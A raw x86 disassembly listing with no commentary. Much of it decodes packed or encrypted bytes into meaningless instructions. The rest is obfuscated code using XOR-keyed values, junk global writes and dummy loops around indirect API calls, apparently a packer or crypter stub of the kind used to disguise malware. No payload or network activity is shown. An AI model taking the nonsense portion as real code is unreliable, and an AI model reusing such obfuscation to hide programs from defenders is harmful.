  407fef:	gs repz mov ah,0xaa
  407ff3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ff4:	adc    eax,0x237a0a84
  407ff9:	push   es
  407ffa:	std    
  407ffb:	jp     0x407faa
  407ffd:	mov    eax,ecx
  407fff:	arpl   sp,bx
  408001:	mov    eax,0x6f5cfbb5
  408006:	in     al,dx
  408007:	enter  0xc0b,0xf8
  40800b:	outs   dx,DWORD PTR ds:[esi]
  40800c:	arpl   ax,bp
  40800e:	mov    BYTE PTR [ebp+0x4],ch
  408011:	jo     0x408011
  408013:	ja     0x407ff5
  408015:	inc    esp
  408016:	sti    
  408017:	je     0x408011
  408019:	push   0x16af544
  40801e:	sub    DWORD PTR [edi+0x445aabd5],eax
  408024:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408025:	pop    esi
  408026:	sbb    al,BYTE PTR [esi-0x4c]
  408029:	sbb    cl,BYTE PTR [ebx]
  40802b:	fadd   st,st(6)
  40802d:	dec    esp
  40802e:	ss lahf 
  408030:	dec    esi
  408031:	inc    ebp
  408032:	div    DWORD PTR [edx]
  408034:	add    bl,dh
  408036:	jecxz  0x408076
  408038:	jne    0x4080a4
  40803a:	ds jle 0x407fd5
  40803d:	fmul   DWORD PTR [ebx]
  40803f:	call   0xdbbd:0xefbd5d8d
  408046:	sbb    BYTE PTR [esi+0x771ebde3],0x24
  40804d:	dec    edi
  40804e:	fbld   TBYTE PTR [edi+0x28]
  408051:	push   es
  408052:	mulps  xmm0,XMMWORD PTR [edx-0x55530c61]
  408059:	mov    ebp,0xe025a4c0
  40805e:	loop   0x40801c
  408060:	mov    edx,0xda5841c0
  408065:	push   eax
  408066:	out    dx,al
  408067:	push   eax
  408068:	arpl   WORD PTR [eax],ax
  40806a:	imul   ebp,ebx,0x31d5c0cf
  408070:	add    ecx,eax
  408072:	loope  0x408070
  408074:	ja     0x408086
  408076:	gs cmc 
  408078:	cmp    eax,0xb06685c4
  40807d:	inc    edx
  40807e:	adc    BYTE PTR ds:0x11b962b1,ch
  408084:	dec    esp
  408085:	jo     0x40803a
  408087:	shl    al,cl
  408089:	int    0xbb
  40808b:	js     0x4080fc
  40808d:	and    al,BYTE PTR [ebx+eiz*8]
  408090:	dec    edx
  408091:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408092:	xchg   ecx,eax
  408093:	call   0x138700b5
  408098:	icebp  
  408099:	xchg   ebp,eax
  40809a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40809b:	jecxz  0x4080dd
  40809d:	inc    ecx
  40809e:	js     0x4080ae
  4080a0:	arpl   WORD PTR [edx+esi*1+0x7b86db4a],bx
  4080a7:	js     0x4080ba
  4080a9:	xchg   edx,eax
  4080aa:	popf   
  4080ab:	(bad)  
  4080ac:	xor    eax,0x2e263289
  4080b1:	les    ebx,FWORD PTR [esi+0x5703b8f4]
  4080b7:	mov    esi,0x4cc96573
  4080bc:	inc    BYTE PTR [ecx+0x29]
  4080bf:	sbb    BYTE PTR [eax+0x2534dd18],ch
  4080c5:	mov    DWORD PTR [ebx-0x1a7ab0bd],ebx
  4080cb:	xlat   BYTE PTR ds:[ebx]
  4080cc:	mov    DWORD PTR [eax-0x47dc516f],ebx
  4080d2:	push   ecx
  4080d3:	mov    ds:0xad6fefa,eax
  4080d8:	je     0x4080a4
  4080da:	dec    edx
  4080db:	mov    BYTE PTR [ebx],ah
  4080dd:	repnz add eax,eax
  4080e0:	bound  edx,QWORD PTR [ebx]
  4080e2:	(bad)  
  4080e3:	(bad)  
  4080e4:	arpl   WORD PTR [edi],bp
  4080e6:	xchg   edi,eax
  4080e7:	pop    ebx
  4080e8:	push   ebx
  4080e9:	cmp    BYTE PTR [ecx],bl
  4080eb:	dec    edx
  4080ec:	sub    bh,bl
  4080ee:	scas   eax,DWORD PTR es:[edi]
  4080ef:	pop    ss
  4080f0:	and    esi,DWORD PTR [edx-0x5986b8a2]
  4080f6:	lahf   
  4080f7:	mov    ds:0x7e3bd326,eax
  4080fc:	(bad)  
  4080fd:	jmp    0x4080b2
  4080ff:	scas   al,BYTE PTR es:[edi]
  408100:	xor    edi,DWORD PTR [esi-0x48]
  408103:	mov    dh,0xa0
  408105:	aas    
  408106:	jae    0x4080f7
  408108:	xor    eax,DWORD PTR [eax-0x3a]
  40810b:	and    eax,0xdfa2fdb0
  408110:	cs ds mov edx,0x7e1c6bcf
  408117:	and    ah,BYTE PTR [ecx]
  408119:	fwait
  40811a:	(bad)  
  40811b:	jge    0x40817a
  40811d:	js     0x4080c1
  40811f:	or     DWORD PTR [ebx+0x44],edx
  408122:	jmp    0xbc96:0xe8ac5107
  408129:	push   ebp
  40812a:	(bad)  [edx]
  40812c:	jnp    0x40817d
  40812e:	inc    ecx
  40812f:	mov    ds:0x2f2fe0e4,eax
  408134:	mov    ah,0xe4
  408136:	clc    
  408137:	pop    ds
  408138:	jge    0x4080f6
  40813a:	mov    esi,0x535647e7
  40813f:	jo     0x408197
  408141:	stc    
  408142:	mov    ds:0x9292d5b3,al
  408147:	inc    edx
  408148:	xchg   ebp,eax
  408149:	cmp    eax,0x2d2dac3
  40814e:	scas   eax,DWORD PTR es:[edi]
  40814f:	hlt    
  408150:	xchg   ebx,eax
  408151:	lds    ebx,FWORD PTR [edi+ecx*2-0x7464c33]
  408158:	fisub  WORD PTR [esi]
  40815a:	sbb    ecx,DWORD PTR [eax+0x343b4c5f]
  408160:	sbb    al,0x5f
  408162:	and    al,0x7
  408164:	pop    eax
  408165:	jmp    FWORD PTR [ebp-0x6f47de61]
  40816b:	jp     0x40818e
  40816d:	nop
  40816e:	sbb    DWORD PTR [edx+eax*4+0x5c134e4a],ecx
  408175:	jge    0x40810b
  408177:	xor    BYTE PTR [edx+0xd],0x35
  40817b:	stos   BYTE PTR es:[edi],al
  40817c:	test   DWORD PTR [ebp-0x63e69678],ecx
  408182:	and    DWORD PTR [esi+0x8],edx
  408185:	dec    esp
  408186:	mov    ebp,0xb26c187d
  40818b:	and    DWORD PTR [edx],eax
  40818d:	outs   dx,DWORD PTR ds:[esi]
  40818e:	mov    bh,0x16
  408190:	adc    al,BYTE PTR [ebx-0x2cb034b0]
  408196:	fisttp QWORD PTR [eax+eax*1+0x5daa9bb6]
  40819d:	xchg   WORD PTR [ecx-0xeb5078f],di
  4081a4:	mov    ds:0x6fcb75c6,ax
  4081aa:	xor    al,0xdc
  4081ac:	icebp  
  4081ad:	ret    
  4081ae:	xor    dl,dh
  4081b0:	and    ecx,DWORD PTR [edi]
  4081b2:	out    0x80,al
  4081b4:	test   al,0xd0
  4081b6:	repnz popw ss
  4081b9:	retf   
  4081ba:	jmp    0x4081c2
  4081bc:	dec    edx
  4081bd:	dec    esi
  4081be:	xchg   ebx,eax
  4081bf:	sahf   
  4081c0:	out    dx,al
  4081c1:	and    DWORD PTR [ecx-0x6a],edi
  4081c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081c5:	cmovne edi,edx
  4081c8:	cmove  eax,ecx
  4081cb:	stos   DWORD PTR es:[edi],eax
  4081cc:	rcl    DWORD PTR [edx+0x7],cl
  4081cf:	xchg   esp,eax
  4081d0:	loopne 0x4081e0
  4081d2:	call   0x647c4c5c
  4081d7:	push   esi
  4081d8:	pop    esp
  4081d9:	jb     0x4081e9
  4081db:	push   0xf2827ff1
  4081e0:	pusha  
  4081e1:	sti    
  4081e2:	int    0x8b
  4081e4:	idiv   DWORD PTR [ecx+0x4e88ce10]
  4081ea:	cmp    eax,0x70ed7b50
  4081ef:	add    edi,DWORD PTR [ebx+0x3f]
  4081f2:	xchg   esp,eax
  4081f3:	sub    edi,ebp
  4081f5:	or     ecx,DWORD PTR [ebx-0x5b]
  4081f8:	gs pusha 
  4081fa:	and    edx,eax
  4081fc:	iret   
  4081fd:	pop    esp
  4081fe:	repnz mov bh,0xf0
  408201:	aaa    
  408202:	retf   0x317e
  408205:	nop
  408206:	cmp    esi,DWORD PTR ds:0x7d6a8b88
  40820c:	jno    0x408230
  40820e:	pop    esi
  40820f:	arpl   WORD PTR [ebp-0x641201ae],ax
  408215:	mov    ah,0xac
  408217:	mov    ds:0xfd77a93,eax
  40821c:	adc    eax,0x1bfe5dc5
  408221:	mov    ch,0xca
  408223:	mov    eax,ds:0xac8ad414
  408228:	mov    edi,0x6e2c8e1e
  40822d:	jmp    0x7e2d627b
  408232:	daa    
  408233:	stc    
  408234:	sbb    DWORD PTR [edi],esp
  408236:	icebp  
  408237:	(bad)  
  408238:	cmc    
  408239:	jl     0x408230
  40823b:	stos   BYTE PTR es:[edi],al
  40823c:	ucomiss xmm2,DWORD PTR [edx+ecx*2]
  408240:	ret    
  408241:	jo     0x40827e
  408243:	outs   dx,DWORD PTR ds:[esi]
  408244:	and    eax,edx
  408246:	leave  
  408247:	ss nop
  408249:	ins    BYTE PTR es:[edi],dx
  40824a:	fldcw  WORD PTR ds:0xa732978f
  408250:	addr16 mov esp,ss
  408253:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408254:	ins    DWORD PTR es:[edi],dx
  408255:	xor    bh,BYTE PTR [ebx-0x51e156d1]
  40825b:	(bad)  [ebp-0x723d88cc]
  408261:	dec    esi
  408262:	or     eax,0xf395f932
  408267:	mov    ds:0xfdb19be7,eax
  40826c:	enter  0x66cb,0x10
  408270:	scas   al,BYTE PTR es:[edi]
  408271:	xor    eax,0xd0111dbf
  408276:	push   0xfffffff9
  408278:	sub    BYTE PTR [esi],bh
  40827a:	inc    edx
  40827b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40827c:	sub    DWORD PTR [edi+ebx*2+0x42],edx
  408280:	xchg   edi,eax
  408281:	push   esi
  408282:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408283:	(bad)  
  408284:	jns    0x4082e4
  408286:	aam    0x7b
  408288:	sbb    BYTE PTR [eax-0x51],dl
  40828b:	call   0x371e:0x64a15e10
  408292:	cs scas eax,DWORD PTR es:[edi]
  408294:	dec    edi
  408295:	aaa    
  408296:	dec    edi
  408297:	into   
  408298:	inc    esp
  408299:	cmp    BYTE PTR [ecx-0x66db59d7],ah
  40829f:	adc    BYTE PTR [ebx+ebx*2-0x6904c2b0],0xe3
  4082a7:	enter  0xffc8,0xf5
  4082ab:	mov    ah,BYTE PTR [ecx]
  4082ad:	scas   al,BYTE PTR es:[edi]
  4082ae:	sbb    al,0xe
  4082b0:	xor    DWORD PTR [edx],edi
  4082b2:	gs add al,0xdc
  4082b5:	jge    0x4082f0
  4082b7:	sub    eax,0xcaa474ca
  4082bc:	aaa    
  4082bd:	inc    esi
  4082be:	out    0x34,al
  4082c0:	mov    ds:0xd6ab7a41,al
  4082c5:	mov    cl,0x98
  4082c7:	jle    0x40832b
  4082c9:	fsub   QWORD PTR [esp+edx*4]
  4082cc:	loope  0x4082f6
  4082ce:	popa   
  4082cf:	call   0x40af182a
  4082d4:	retf   0x68ff
  4082d7:	je     0x4082e1
  4082d9:	(bad)  
  4082da:	shr    BYTE PTR [ecx],cl
  4082dc:	push   esi
  4082dd:	add    BYTE PTR [esi],0x87
  4082e0:	in     eax,dx
  4082e1:	sub    DWORD PTR [ebx],0xffffffe7
  4082e4:	fdivr  st,st(2)
  4082e6:	push   ecx
  4082e7:	fmul   DWORD PTR [eax+esi*4+0x43]
  4082eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082ec:	push   esp
  4082ed:	xchg   ebp,eax
  4082ee:	and    eax,0xf325af61
  4082f3:	iret   
  4082f4:	and    al,0x10
  4082f6:	mov    al,0x7c
  4082f8:	stc    
  4082f9:	adc    DWORD PTR [ebx+0x6d29fd9d],esi
  4082ff:	daa    
  408300:	inc    eax
  408301:	push   ds
  408302:	dec    esi
  408303:	sub    al,0x42
  408305:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408306:	(bad)
  408309:	mov    al,ds:0x2fb4fa1b
  40830e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40830f:	add    BYTE PTR [eax],al
  408311:	fwait
  408312:	jbe    0x40830d
  408314:	repnz enter 0xcc24,0x4c
  408319:	mov    dl,0x14
  40831b:	push   ds
  40831c:	retf   
  40831d:	pop    eax
  40831e:	adc    DWORD PTR [ebx-0x6538b84c],edx
  408324:	push   esp
  408325:	mov    esi,DWORD PTR [edi-0x6b92658c]
  40832b:	inc    edx
  40832c:	pop    ebp
  40832d:	clc    
  40832e:	imul   ebp,DWORD PTR [edi+0xb],0xffffffe6
  408332:	aad    0x9e
  408334:	arpl   bp,di
  408336:	fsubr  st(5),st
  408338:	pop    ebx
  408339:	xchg   ah,ah
  40833b:	xchg   esp,eax
  40833c:	lods   eax,DWORD PTR ds:[esi]
  40833d:	pop    eax
  40833e:	mov    ecx,0xf2a0b2b4
  408343:	and    BYTE PTR [ecx+0x7b],0x13
  408347:	arpl   di,ax
  408349:	(bad)  
  40834a:	shl    BYTE PTR [ecx+0x43],1
  40834d:	faddp  st(0),st
  40834f:	gs nop
  408351:	sub    eax,0xfd45a0ba
  408356:	(bad)  
  408358:	pop    ebx
  408359:	fmul   st,st(2)
  40835b:	adc    al,0xcd
  40835d:	mov    ds:0x66f2ebf5,al
  408362:	pop    esp
  408363:	mov    ds:0xc6e00270,al
  408368:	rcr    bl,1
  40836a:	push   esp
  40836b:	lds    eax,FWORD PTR [edi]
  40836d:	push   cs
  40836e:	xor    BYTE PTR [edi+0x57f5442f],ch
  408374:	neg    edi
  408376:	loopne 0x4083ef
  408378:	bound  eax,QWORD PTR [esi]
  40837a:	push   ss
  40837b:	ret    0x4d3b
  40837e:	outs   dx,DWORD PTR ds:[esi]
  40837f:	pop    edx
  408380:	repz adc al,dh
  408383:	(bad)  
  408384:	mov    ebx,0x6c534bf0
  408389:	js     0x4083ab
  40838b:	sar    ebp,0xac
  40838e:	mov    cl,0xb0
  408390:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408391:	rol    DWORD PTR [eax+edi*2+0x23],cl
  408395:	mov    WORD PTR [eax],gs
  408397:	cmc    
  408398:	shl    DWORD PTR [esi],1
  40839a:	mov    bh,0x8d
  40839c:	pop    ebp
  40839d:	lahf   
  40839e:	shl    edi,1
  4083a0:	addr16 icebp 
  4083a2:	rcr    esi,1
  4083a4:	pusha  
  4083a5:	jl     0x4083c9
  4083a7:	enter  0x528d,0x49
  4083ab:	push   esp
  4083ac:	push   ecx
  4083ad:	mov    dh,0x71
  4083af:	mov    edx,0xe6c7d9b4
  4083b4:	mov    BYTE PTR [edx-0x51],bl
  4083b7:	push   0xffffffc1
  4083b9:	xchg   ebp,eax
  4083ba:	sti    
  4083bb:	xor    DWORD PTR [esi],esi
  4083bd:	adc    ah,cl
  4083bf:	dec    esp
  4083c0:	retf   
  4083c1:	std    
  4083c2:	mov    esp,0x4f2d6f25
  4083c7:	fidivr DWORD PTR [edi-0x55]
  4083ca:	fwait
  4083cb:	xchg   edx,eax
  4083cc:	pop    ebx
  4083cd:	mov    cl,0xaf
  4083cf:	outs   dx,BYTE PTR es:[esi]
  4083d1:	or     DWORD PTR ds:0xd3656378,ebx
  4083d7:	fdiv   DWORD PTR [edx]
  4083d9:	jp     0x4083d5
  4083db:	dec    esp
  4083dc:	sbb    eax,0x75596dc7
  4083e1:	aas    
  4083e2:	fild   WORD PTR [esi]
  4083e4:	fwait
  4083e5:	xchg   edx,eax
  4083e6:	jge    0x4083db
  4083e8:	inc    esp
  4083e9:	and    DWORD PTR [edi+ebx*2],edx
  4083ec:	call   0xf9a5c049
  4083f1:	pop    edx
  4083f2:	pop    edi
  4083f3:	cmp    eax,DWORD PTR [edi]
  4083f5:	sbb    cl,BYTE PTR ds:0xfc702f66
  4083fb:	cmc    
  4083fc:	inc    ecx
  4083fd:	jge    0x4083fc
  4083ff:	ror    BYTE PTR [ebx-0x5c1670ff],1
  408405:	jmp    0xe234:0x6d6fee9a
  40840c:	pop    DWORD PTR [edi-0x3c]
  40840f:	jecxz  0x408448
  408411:	jl     0x4083e8
  408413:	je     0x4083e0
  408415:	mov    dh,0xdb
  408417:	or     cl,bl
  408419:	xor    eax,0xc46efe60
  40841e:	mov    esp,0x65143c4a
  408423:	repnz xchg edx,eax
  408425:	outs   dx,DWORD PTR ds:[esi]
  408426:	push   cs
  408427:	(bad)  
  408429:	mov    WORD PTR ss:[edx+ebx*4+0x71f26eef],es
  408431:	dec    esp
  408432:	xchg   ebp,eax
  408433:	popf   
  408434:	sbb    eax,0x5e0862e0
  408439:	in     eax,dx
  40843a:	jmp    0x408428
  40843c:	(bad)  
  40843d:	outs   dx,BYTE PTR ds:[esi]
  40843e:	sub    ebx,esp
  408440:	and    DWORD PTR [edx],edi
  408442:	cmp    bh,BYTE PTR ds:0xd249d1a8
  408448:	les    esi,FWORD PTR [eax-0xa071689]
  40844e:	outs   dx,DWORD PTR ds:[esi]
  40844f:	push   ebx
  408450:	out    0xeb,eax
  408452:	dec    ebx
  408453:	in     eax,dx
  408454:	sbb    BYTE PTR [ebp-0x38b7fa94],dl
  40845a:	jp     0x40842c
  40845c:	or     ebx,DWORD PTR [esi-0x1f192bdd]
  408462:	mov    BYTE PTR [edx],bl
  408464:	or     al,0xa2
  408466:	ret    
  408467:	mov    bh,0xfc
  408469:	mov    al,BYTE PTR [eax+edx*1]
  40846c:	mov    BYTE PTR [ebp-0x1],al
  40846f:	mov    eax,DWORD PTR [ebp-0x30]
  408472:	mov    edx,DWORD PTR [ebp-0xc]
  408475:	xor    eax,esi
  408477:	add    eax,edi
  408479:	imul   eax,edx
  40847c:	mov    edx,DWORD PTR [ebp-0x28]
  40847f:	xor    edx,esi
  408481:	add    eax,edx
  408483:	mov    edx,DWORD PTR [ebp-0x8]
  408486:	movzx  eax,BYTE PTR [eax+edx*1+0x3272fa]
  40848e:	mov    edx,DWORD PTR [ebp-0x50]
  408491:	xor    edx,esi
  408493:	lea    eax,[edx+eax*1+0x3272fa]
  40849a:	movzx  edx,BYTE PTR [ebp-0x1]
  40849e:	xor    edx,eax
  4084a0:	mov    BYTE PTR [ebp-0x1],dl
  4084a3:	mov    al,BYTE PTR [ebp-0x1]
  4084a6:	mov    edx,DWORD PTR [ebp-0x30]
  4084a9:	mov    ebx,DWORD PTR [ebp-0xc]
  4084ac:	xor    edx,esi
  4084ae:	add    edx,edi
  4084b0:	imul   edx,ebx
  4084b3:	mov    ebx,DWORD PTR [ebp-0x8]
  4084b6:	mov    BYTE PTR [edx+ebx*1],al
  4084b9:	mov    eax,DWORD PTR [ebp-0x40]
  4084bc:	mov    edx,DWORD PTR [ebp-0x28]
  4084bf:	xor    eax,esi
  4084c1:	xor    edx,esi
  4084c3:	add    eax,edi
  4084c5:	add    edx,edi
  4084c7:	imul   eax,edx
  4084ca:	add    eax,DWORD PTR [ebp-0xc]
  4084cd:	mov    DWORD PTR [ebp-0xc],eax
  4084d0:	mov    eax,DWORD PTR [ebp-0xc]
  4084d3:	mov    edx,DWORD PTR [ebp-0x18]
  4084d6:	cmp    edx,eax
  4084d8:	jb     0x406053
  4084de:	mov    eax,DWORD PTR [ebp-0x28]
  4084e1:	mov    edx,DWORD PTR [ebp-0x18]
  4084e4:	xor    eax,esi
  4084e6:	add    eax,edi
  4084e8:	imul   eax,edx
  4084eb:	mov    edx,DWORD PTR [ebp-0x1c]
  4084ee:	xor    edx,esi
  4084f0:	add    edx,edi
  4084f2:	or     eax,edx
  4084f4:	mov    edx,DWORD PTR [ebp-0x20]
  4084f7:	xor    edx,esi
  4084f9:	add    eax,edx
  4084fb:	mov    edx,DWORD PTR [ebp-0x20]
  4084fe:	xor    edx,esi
  408500:	add    eax,edx
  408502:	mov    edx,DWORD PTR [ebp-0x10]
  408505:	lea    eax,[eax+edx*1+0x64e5f4]
  40850c:	jmp    0x408520
  408511:	mov    eax,DWORD PTR [ebp-0x20]
  408514:	mov    edx,DWORD PTR [ebp-0x10]
  408517:	xor    eax,esi
  408519:	lea    eax,[eax+edx*1+0x3272fa]
  408520:	mov    DWORD PTR [ebp-0x10],eax
  408523:	jmp    0x405fa0
  408528:	mov    ebx,DWORD PTR [ebp-0x3c]
  40852b:	mov    eax,DWORD PTR [ebp+0xc]
  40852e:	xor    eax,esi
  408530:	lea    ecx,[ecx+eax*1+0x3272fa]
  408537:	lea    eax,[ecx-0x3272fa]
  40853d:	xor    eax,esi
  40853f:	cmp    eax,0xf89c95b5
  408544:	jne    0x403bac
  40854a:	dec    DWORD PTR [ebp-0x34]
  40854d:	jne    0x403ba0
  408553:	mov    eax,DWORD PTR [ebp+0x8]
  408556:	mov    ecx,DWORD PTR [ebp+0xc]
  408559:	mov    edx,DWORD PTR [ebp+0x8]
  40855c:	xor    ecx,esi
  40855e:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272fa]
  408565:	xor    eax,esi
  408567:	mov    al,BYTE PTR [eax+ebx*1+0x3272fa]
  40856e:	xor    edx,esi
  408570:	mov    BYTE PTR [edx+ebx*1+0x3272fa],cl
  408577:	mov    ecx,DWORD PTR [ebp+0xc]
  40857a:	xor    ecx,esi
  40857c:	mov    BYTE PTR [ecx+ebx*1+0x3272fa],al
  408583:	mov    eax,DWORD PTR [ebp+0xc]
  408586:	xor    eax,esi
  408588:	add    eax,edi
  40858a:	pop    edi
  40858b:	pop    esi
  40858c:	pop    ebx
  40858d:	leave  
  40858e:	ret    0x8
  408591:	xor    eax,eax
  408593:	ret    
  408594:	push   ebp
  408595:	mov    ebp,esp
  408597:	sub    esp,0x38
  40859a:	and    DWORD PTR ds:0x426ebd,0x0
  4085a4:	mov    eax,ds:0x426ebd
  4085a9:	inc    eax
  4085aa:	mov    ds:0x426ebd,eax
  4085af:	cmp    DWORD PTR ds:0x426ebd,0x1d
  4085b6:	jg     0x4085e2
  4085bc:	jmp    0x4085d5
  4085c1:	push   DWORD PTR [ebp-0x10]
  4085c4:	push   0x2f91
  4085c9:	push   DWORD PTR [ebp-0x20]
  4085cc:	push   DWORD PTR [ebp-0x1c]
  4085cf:	call   DWORD PTR ds:0x42fa1c
  4085d5:	cmp    DWORD PTR ds:0x426ebd,0x1c
  4085dc:	jb     0x4085a4
  4085e2:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  4085e9:	sbb    DWORD PTR ds:0x426f19,ecx
  4085ef:	push   ebx
  4085f0:	add    DWORD PTR ds:0x426f15,edx
  4085f6:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  4085fd:	xor    DWORD PTR ds:0x426e91,0x301b
  408607:	mov    eax,DWORD PTR [ebp-0x4]
  40860a:	xor    DWORD PTR ds:0x426f2d,0x2f12
  408614:	push   esi
  408615:	sbb    DWORD PTR ds:0x426ed9,edi
  40861b:	mov    esi,0x75108b3
  408620:	or     DWORD PTR ds:0x426eb9,0x50e3
  40862a:	xor    eax,esi
  40862c:	adc    DWORD PTR ds:0x426ecd,0x426e99
  408636:	push   edi
  408637:	mov    edi,0x3272fa
  40863c:	or     DWORD PTR ds:0x426ea1,0x426e81
  408646:	add    eax,edi
  408648:	and    DWORD PTR ds:0x426f29,0x7053
  408652:	mov    DWORD PTR [ebp-0x1c],eax
  408655:	mov    eax,DWORD PTR [ebp+0x14]
  408658:	test   eax,eax
  40865a:	mov    DWORD PTR ds:0x426f09,0x1147
  408664:	je     0x408688
  40866a:	mov    eax,ds:0x426ec5
  40866f:	and    eax,DWORD PTR ds:0x426e89
  408675:	mov    ds:0x426ec5,eax
  40867a:	mov    eax,DWORD PTR [ebp+0x14]
  40867d:	adc    ebx,0x54d7
  408683:	mov    eax,DWORD PTR [eax]
  408685:	mov    DWORD PTR [ebp-0x1c],eax
  408688:	mov    eax,DWORD PTR [ebp-0x4]
  40868b:	and    DWORD PTR ds:0x426ea1,0x0
  408695:	mov    ebx,DWORD PTR ds:0x426ea1
  40869b:	inc    ebx
  40869c:	mov    DWORD PTR ds:0x426ea1,ebx
  4086a2:	cmp    DWORD PTR ds:0x426ea1,0x9
  4086a9:	ja     0x4086e9
  4086af:	jmp    0x4086c2
  4086b4:	push   0x426e8d
  4086b9:	push   DWORD PTR [ebp-0x14]
  4086bc:	call   DWORD PTR ds:0x42fa48
  4086c2:	cmp    DWORD PTR ds:0x426ea1,0x8
  4086c9:	jne    0x4086dc
  4086cf:	mov    ebx,DWORD PTR ds:0x426ea1
  4086d5:	inc    ebx
  4086d6:	mov    DWORD PTR ds:0x426ea1,ebx
  4086dc:	cmp    DWORD PTR ds:0x426ea1,0x1e
  4086e3:	jb     0x408695
  4086e9:	xor    eax,esi
  4086eb:	sbb    ebx,DWORD PTR ds:0x426e85
  4086f1:	add    eax,edi
  4086f3:	mov    DWORD PTR [ebp-0x8],eax
  4086f6:	mov    eax,ds:0x426e85
  4086fb:	sub    DWORD PTR ds:0x426ed9,eax
  408701:	mov    eax,DWORD PTR [ebp-0xc]
  408704:	xor    eax,esi
  408706:	and    DWORD PTR ds:0x426edd,ecx
  40870c:	add    eax,edi
  40870e:	mov    DWORD PTR [ebp-0x24],eax
  408711:	mov    eax,DWORD PTR [ebp-0x4]
  408714:	xor    eax,esi
  408716:	and    DWORD PTR ds:0x426eb1,0x0
  408720:	jmp    0x408734
  408725:	xor    ebx,ebx
  408727:	or     ebx,DWORD PTR ds:0x426eb1
  40872d:	inc    ebx
  40872e:	mov    DWORD PTR ds:0x426eb1,ebx
  408734:	cmp    DWORD PTR ds:0x426eb1,0x15
  40873b:	jae    0x40878a
  408741:	cmp    DWORD PTR ds:0x426eb1,0x4
  408748:	ja     0x40878a
  40874e:	jmp    0x40876b
  408753:	push   0x3639
  408758:	push   0x1bb0
  40875d:	push   DWORD PTR [ebp-0x10]
  408760:	push   0x5fa6
  408765:	call   DWORD PTR ds:0x42fa4c
  40876b:	cmp    DWORD PTR ds:0x426eb1,0x3
  408772:	jne    0x408785
  408778:	mov    ebx,DWORD PTR ds:0x426eb1
  40877e:	inc    ebx
  40877f:	mov    DWORD PTR ds:0x426eb1,ebx
  408785:	jmp    0x408725
  40878a:	add    eax,edi
  40878c:	movzx  ebx,BYTE PTR ds:0x426f15
  408793:	sub    DWORD PTR ds:0x426ea1,ebx
  408799:	mov    DWORD PTR [ebp-0x30],eax
  40879c:	sub    eax,eax
  40879e:	mov    ebx,DWORD PTR [ebp-0x4]
  4087a1:	not    eax
  4087a3:	xor    ebx,esi
  4087a5:	add    ebx,edi
  4087a7:	sbb    eax,0xd90
  4087ac:	mov    eax,DWORD PTR [ebp-0x24]
  4087af:	dec    DWORD PTR ds:0x426ea9
  4087b5:	sub    eax,edi
  4087b7:	lea    ecx,[ebx-0x3272fa]
  4087bd:	sbb    DWORD PTR ds:0x426f29,0x78a2
  4087c7:	xor    eax,esi
  4087c9:	add    DWORD PTR ds:0x426ec9,0x4dad
  4087d3:	xor    ecx,esi
  4087d5:	cmp    ecx,eax
  4087d7:	mov    DWORD PTR ds:0x426ef5,0x6961
  4087e1:	je     0x408aae
  4087e7:	add    DWORD PTR ds:0x426f01,0x426f15
  4087f1:	mov    eax,DWORD PTR [ebp-0x4]
  4087f4:	sub    DWORD PTR ds:0x426e81,0x820
  4087fe:	xor    eax,esi
  408800:	add    eax,edi
  408802:	mov    DWORD PTR ds:0x426eb1,0x301a
  40880c:	cmp    ebx,eax
  40880e:	mov    DWORD PTR ds:0x426ee5,0x6594
  408818:	jne    0x408a65
  40881e:	push   DWORD PTR [ebp+0x8]
  408821:	sub    DWORD PTR ds:0x426ee9,0x426f19
  40882b:	call   0x41d4a8
  408830:	mov    DWORD PTR [ebp-0x14],eax
  408833:	sub    DWORD PTR ds:0x426f15,edx
  408839:	mov    eax,DWORD PTR [ebp-0x4]
  40883c:	and    ecx,0x4a39
  408842:	mov    ecx,DWORD PTR [ebp-0x14]
  408845:	xor    eax,esi
  408847:	sub    DWORD PTR ds:0x426eb5,0x426f0d
  408851:	add    eax,edi
  408853:	cmp    ecx,eax
  408855:	je     0x40aece
  40885b:	adc    DWORD PTR ds:0x426f25,0x56c1
  408865:	push   DWORD PTR [ebp-0x14]
  408868:	and    DWORD PTR ds:0x426f29,0x426f11
  408872:	push   DWORD PTR [ebp+0x8]
  408875:	and    DWORD PTR ds:0x426ed1,0x426ef9
  40887f:	call   0x41f8dc
  408884:	and    ecx,0xfc3
  40888a:	mov    DWORD PTR [ebp-0x14],eax
  40888d:	mov    DWORD PTR ds:0x426f09,0x15
  408897:	cmp    DWORD PTR ds:0x426f09,0x0
  40889e:	je     0x4088e4
  4088a4:	cmp    DWORD PTR ds:0x426f09,0x9
  4088ab:	ja     0x4088e4
  4088b1:	jmp    0x4088bc
  4088b6:	call   DWORD PTR ds:0x42fa20
  4088bc:	cmp    DWORD PTR ds:0x426f09,0xa
  4088c3:	jne    0x4088d4
  4088c9:	mov    eax,ds:0x426f09
  4088ce:	dec    eax
  4088cf:	mov    ds:0x426f09,eax
  4088d4:	mov    eax,ds:0x426f09
  4088d9:	dec    eax
  4088da:	mov    ds:0x426f09,eax
  4088df:	jmp    0x408897
  4088e4:	mov    eax,DWORD PTR [ebp-0x4]
  4088e7:	mov    ecx,DWORD PTR [ebp-0x14]
  4088ea:	add    DWORD PTR ds:0x426f01,0x32f5
  4088f4:	xor    eax,esi
  4088f6:	sub    DWORD PTR ds:0x426f11,0x426ec1
  408900:	add    eax,edi
  408902:	mov    DWORD PTR ds:0x426e81,0x73a8
  40890c:	cmp    ecx,eax
  40890e:	mov    DWORD PTR ds:0x426e81,0x4555
  408918:	je     0x40aece
  40891e:	mov    eax,DWORD PTR [ebp-0x14]
  408921:	mov    eax,DWORD PTR [eax+0x18]
  408924:	xor    DWORD PTR ds:0x426edd,0x1983
